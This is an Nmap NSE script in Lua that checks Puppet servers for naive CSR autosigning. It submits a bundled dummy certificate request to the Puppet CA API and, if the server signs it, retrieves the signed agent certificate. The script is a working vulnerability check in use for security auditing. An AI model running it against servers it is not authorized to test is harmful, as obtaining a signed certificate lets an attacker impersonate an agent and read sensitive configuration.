local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local http = require "http"
local table = require "table"
local io = require "io"
local base64 = require "base64"

description = [[
Detects if naive signing is enabled on a Puppet server. This enables attackers
to create any Certificate Signing Request and have it signed, allowing them
to impersonate as a puppet agent. This can leak the configuration of the agents
as well as any other sensitive information found in the configuration files.

This script makes use of the Puppet HTTP API interface to sign the request.

This script has been Tested on versions 3.8.5, 4.10.

References:
* https://docs.puppet.com/puppet/4.10/ssl_autosign.html#security-implications-of-nave-autosigning
]]

---
-- @usage nmap -p 8140 --script puppet-naivesigning <target>
-- @usage nmap -p 8140 --script puppet-naivesigning --script-args puppet-naivesigning.csr=other.csr,puppet-naivesigning.node=agency <target>
--
-- @output
-- PORT     STATE SERVICE REASON
-- 8140/tcp open  puppet  syn-ack ttl 64
-- | puppet-naivesigning:
-- |   Puppet Naive autosigning enabled! Naive autosigning causes the Puppet CA to autosign ALL CSRs.
-- |   Attackers will be able to obtain a configuration catalog, which might contain sensitive information.
-- |   -----BEGIN CERTIFICATE-----
-- |   MIIFfjCCA2agAwIBAgIBEjANBgkqhkiG9w0BAQsFADAoMSYwJAYDVQQDDB1QdXBw
-- |_  ZXQgQ0E6IHVidW50dS5sb2NhbGRvbWFpbjAeFw0xNzA2MjkxNjQzMjZaFw0yMjA
--
-- @xmloutput
-- <script id="puppet-naivesigning" output="&#xa;  Puppet Naive autosigning enabled! Naive autosigning causes the Puppet CA to autosign ALL CSRs.&#xa;  Attackers will be able to obtain a configuration catalog, which might contain sensitive information.&#xa;  -&#45;&#45;&#45;&#45;BEGIN CERTIFICATE-&#45;&#45;&#45;&#45;&#xa;  MIIFfjCCA2agAwIBAgIBEjANBgkqhkiG9w0BAQsFADAoMSYwJAYDVQQDDB1QdXBw&#xa;  ZXQgQ0E6IHVidW50dS5sb2NhbGRvbWFpbjAeFw0xNzA2MjkxNjQzMjZaFw0yMjA&#xa;"/>
--@args puppet-naivesigning.node - The name of the node in the CSR -> Default: "agentzero.localdomain"
--@args puppet-naivesigning.env - The environment that is provided to the endpoints -> Default: "production"
--@args puppet-naivesigning.csr - The file containing the Certificate Signing Request to replace the default one -> Default: nil
---

author = "Wong Wai Tuck"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}

portrule = shortport.port_or_service( {8140} , "puppet", "tcp", "open")

-- dummy certificate signing request to sign
-- note that replacing the requested node name from the CSR doesn't work
-- you have to generate a new CSR
local DUMMY_CSR= [[
-----BEGIN CERTIFICATE REQUEST-----
MIIEZTCCAk0CAQAwIDEeMBwGA1UEAwwVYWdlbnR6ZXJvLmxvY2FsZG9tYWluMIIC
IjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAu1nXwvGCczXPa/6gQupULuVM
DoSunzhb0NRXQXmRGUqv3dJU+ktQ+laqIAle45zFg7HpiVGNCPs7ZrE/dfKaa+Tg
sIgu+qLLHTo5l9+qhVVJUu3/YrU8RfdW6LrYGKEVqyC8QA71naJq/5jhETEmhpWL
geZg0vpxkGhaC78WGe09oKRNEWkTLi/RjNCmY+1emjMXpwx3rrj1wyinI6b4dXmc
RvdPFX8D9H1R8ihGEasPQNbGqzRmLt2slGstdyKWj1UKDkmDqfiuLNxRbHm7a8b5
BTb4CpYQ88cmdU6Q8RM7+NnFzavlwrWQYxqxK0RlZZDEwCLxdrnETS72tVG9RT8v
oELQNlgYLdFiEL02XjiDYK8p7dEtlh4+Om8XJDxx+F1Ycom1ygU+NHMgQrIZWyPJ
73V4pm6QApcn0oQ54wYBkr/k8NjCkZOuKv4VQ4MKknvO8gotYsRzGUbDpJ2HzG1U
VRm9ShiDKXpJ7S7ZG07owAk1XxKkBCSembzzQzivPVPJb7IQTogpe3oc4hKO1cbH
rPBSreg6jOqVhClkWP5havq82AHM1K1ZyCiHNzBCnyxb/G1QkiKGhhXMarRKIQPQ
szPeLdxXPVDZ0Rmri6vFdDSuGmOkPyFaEJEhIscF0dSKeBvSwIkN0LmeLU/PXi9N
66ybzjmG9h8SLOCOGjECAwEAAaAAMA0GCSqGSIb3DQEBCwUAA4ICAQBQUG/A+RA3
2fMZTTPb12Dcz9vB09WIynoyd6t0zuaumQEYutR4G0uGNkKwQiFe+oVc2GtoCnr2
MCk1QXEjWYXORDabPzDT+o68CJfzJClPeoKeXCthq1MyGpxgKLRQUoCKJdRVbFoc
WOpgt5T1LzII2UqMSDZuVuKwnvMxc7cTe9TJyBdxS23Ol/Y2GQx+qA6aUeMHUvin
5UwdrOtLdRcPsPfdUtU0VbsObnvLC82knzXT9Ck5sRW6r4MI6C9EQ40ff2LMFvyM
1N0ITTd65NxUe2f4fyfdZ0t/Hd2w5aEbomrkswCEmFaY753cKic+bxVXXFlTNRuI
/39gMwqXf0RQ2bHilEsMVSIzI8K6QV8p3rg+CnZn/a1sSRx+fLfZjEMNV4X/CXzj
YB4XG8QPnbEO3LZ6gts17TxI7LYOd51svgJj5NMZ6sPbQswPqWzit/M8jf2JJESk
CoRHtg9HU+CXNAODAzeh+JoMX41HGKi2lA3xfcIAN1+oojQheJj5A/+X1rpBS7zG
kvIyTFQh1G40rgeSwxUXNxNogKPcF80bJz5BHKaw09qo2rmGw1FeNXwOgzmgCd3Y
zUdrhHojoA2wRsT3zGiXjct8VKVydnRoFRHHoZTQXk6sR81pgV0XiA23pB42dOqZ
L3Gga99UTASI0PZ/dEQA2sooKhIt7pCDMw==
-----END CERTIFICATE REQUEST-----
]]

-- this node name matches the default certificate request
local DEFAULT_NODE = "agentzero.localdomain"
local DEFAULT_ENV = "production"

-- different versions have different paths to the certificate signing endpoint
local PATHS = {
  v3 = '/%s/certificate_request/%s', -- version 3.8
  v4v5 = '/puppet-ca/v1/certificate_request/%s?environment=%s' -- version 4.10 and 5.0
}

--- Checks if the csr's requester matches the provided node's name
--  @param csr The whole certificate signing request
--  @param node The name of the node that you wish to check
--  @return the start and end index of the node's name in the decoded CSR, if the node's name is not found
local function has_node_csr (csr, node)
  local _, _, csr_b64 = string.find(csr, "%-%-%-%-%-BEGIN CERTIFICATE REQUEST%-%-%-%-%-(.-)%-%-%-%-%-END CERTIFICATE REQUEST%-%-%-%-%-")
  string.gsub(csr_b64, "\n", "")
  local decoded_csr = base64.dec(csr_b64)
  return string.find(decoded_csr, node)
end


action = function(host, port)
  local puppet_table = {
    "Puppet Naive autosigning enabled! Naive autosigning causes the Puppet CA to autosign ALL CSRs.",
    "Attackers will be able to obtain a configuration catalog, which might contain sensitive information."
  }
  local scan_success = false
  local options = {}
  options['header'] = {}

  -- parse args
  local node = stdnse.get_script_args(SCRIPT_NAME .. ".node") or DEFAULT_NODE
  local env = stdnse.get_script_args(SCRIPT_NAME .. "env") or DEFAULT_ENV

  local csr_file = stdnse.get_script_args(SCRIPT_NAME .. ".csr")
  local csr
  stdnse.debug1("File: ", csr_file)

  -- load the custom csr if it is provided
  if csr_file then
    local csr_h = io.open(csr_file, "r")
    csr = csr_h:read("*all")
    stdnse.debug1(csr)
    if (not(csr)) or not(string.match(csr, "BEGIN CERTIFICATE REQUEST")) then
      stdnse.debug1("Couldn't load CSR %s", csr_file)
    end
    csr_h.close()
  else
    csr = DUMMY_CSR
  end

  stdnse.debug2("CSR: %s", csr)

  -- check if the CSR matches the node name provided, if it doesn't return an error message
  if not has_node_csr(csr, node) then
    return string.format("[ERROR][%s] The node %s is not in the CSR\n%s",
      SCRIPT_NAME, node, csr)
  end

  -- set acceptable API response to s, so response is returned
  -- see https://github.com/puppetlabs/puppet/blob/master/api/docs/http_certificate_request.md#supported-response-formats
  options['header']['Accept'] = 's'

  -- set content-type to text/plain so the CSR can be deserialized
  -- see https://docs.puppet.com/puppet/3.8/http_api/http_certificate_request.html
  options['header']['Content-Type'] = 'text/plain'

  for version, path in pairs(PATHS) do
    if version == "v3" then
      path = string.format(path, env, node)
    elseif version == "v4v5" then
      path = string.format(path, node, env)
    end

    stdnse.debug1("Path: %s", path)
    local response = http.put(host, port, path, options, csr)
    stdnse.debug1("Status of CSR: %s", response.status)
    stdnse.debug2("Response for CSR: %s", response.body)

    local certificate = {}
    certificate.name = "SIGNED CERTIFICATE"
    -- 200 means it worked
    if response.status == 200 then
      if response.body == "" then
        --likely version 4.10, so have to get the cert out from searching
        local get_cert_path = string.format("/puppet-ca/v1/certificate/%s?environment=%s", node, env)
        local get_cert_response = http.get(host, port, get_cert_path, options)
        response = get_cert_response
        stdnse.debug2("Response for Get Cert: %s", get_cert_response.body)
      end

      if http.response_contains(response, "BEGIN CERTIFICATE") then
        scan_success = true
        table.insert(certificate, response.body)
        table.insert(puppet_table, string.sub(certificate[1], 1, 156))
        break
      end
    elseif http.response_contains(response, "has a signed certificate; ignoring certificate request") then
      scan_success = true
      local get_cert_path = string.format("/%s/certificate/%s", env, node)
      local get_cert_response = http.get(host, port, get_cert_path, options)
      table.insert(certificate, get_cert_response.body)
      table.insert(puppet_table, string.sub(certificate[1], 1, 156))
      break
    elseif not response.status then
      puppet_table = "Puppet CA timeout!"
    end
  end
  return stdnse.format_output(scan_success, puppet_table)
end
